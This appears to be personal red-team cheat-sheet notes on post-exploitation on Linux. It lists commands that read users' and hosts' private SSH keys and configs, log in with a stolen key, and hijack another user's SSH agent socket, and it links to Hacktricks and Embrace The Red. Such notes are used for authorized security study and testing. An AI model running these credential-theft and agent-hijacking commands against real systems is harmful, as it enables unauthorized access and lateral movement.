# Living off the Land

## Password and Keys - SSH Keys

```
$ cat /home/*/.ssh/authorized_keys

$ cat /home/*/.ssh/config

$ cat /home/*/.ssh/identity.pub

$ cat /home/*/.ssh/identity

$ cat /home/*/.ssh/id_rsa.pub

$ cat /home/*/.ssh/id_rsa

$ cat /home/*/.ssh/id_dsa.pub

$ cat /home/*/.ssh/id_dsa

$ cat /etc/ssh/ssh_config

$ cat /etc/ssh/sshd_config

$ cat /etc/ssh/ssh_host*

$ cat /etc/ssh/ssh_host_dsa_key.pub

$ cat /etc/ssh/ssh_host_dsa_key

$ cat /etc/ssh/ssh_host_rsa_key.pub

$ cat /etc/ssh/ssh_host_rsa_key

$ cat /etc/ssh/ssh_host_key.pub

$ cat /etc/ssh/ssh_host_key
```

Once you were able to get the SSH Keys using the chmod command with octal permissions then authenticate through the compromised server

```
$ chmod 600 ssh_key

$ ssh -i ssh_key <user>@<IP>
```

## SSH Agent

TODO: Figure it out how it works.

```
$ env | grep SSH_AUTH_SOCK
```

```
$ eval $(ssh-agent -s)
$ ssh-add -l
```

```
$ pstree -p <username> | grep sshd

$ sudo tr '\0' '\n' < /proc/<sshd_pid>/environ | grep SSH_AUTH_SOCK

$ ps auxeww | grep ssh-agent | grep SSH_AUTH_SOCK | sed 's/.*SSH_AUTH_SOCK=//' | cut -f 1 -d ' '
```

```
$ export SSH_AUTH_SOCK=/path/to/agent.<pid>

$ export SSH_AUTH_SOCK=/tmp/ssh-tqiEl28473/agent.28473

$ ssh user@host
```

---
## References

### Hacktricks

- [Hacktricks: SSH Forward Agent exploitation](https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html)

### Embrace The Red

- [Embrace The Red: TTP Diaries - SSH Agent Hijacking](https://embracethered.com/blog/posts/2022/ttp-diaries-ssh-agent-hijacking/)